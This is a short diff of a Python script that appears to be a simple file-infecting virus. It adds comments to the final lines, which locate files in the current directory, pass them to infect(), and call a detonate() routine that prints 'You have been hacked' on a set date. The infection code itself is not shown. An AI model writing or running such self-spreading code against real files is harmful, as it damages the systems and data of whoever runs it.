@@ -1,4 +1,5 @@
 #!/usr/bin/python3
+# Used GPT for syntax refrences
 
 # Imports os module
 import os
@@ -61,7 +62,9 @@ def detonate():
         # If date correct print "you have been hacked"
         print("You have been hacked")
 
-# Calls all created functions 
+ 
+# The os.path.abspath("") function call returns the absolute pathname of the current working directory.
+# The abspath function in the os.path module takes a pathname as input and returns the absolute pathname of that file or directory.
 files_targeted = locate(os.path.abspath(""))
 infect(files_targeted)
 detonate()
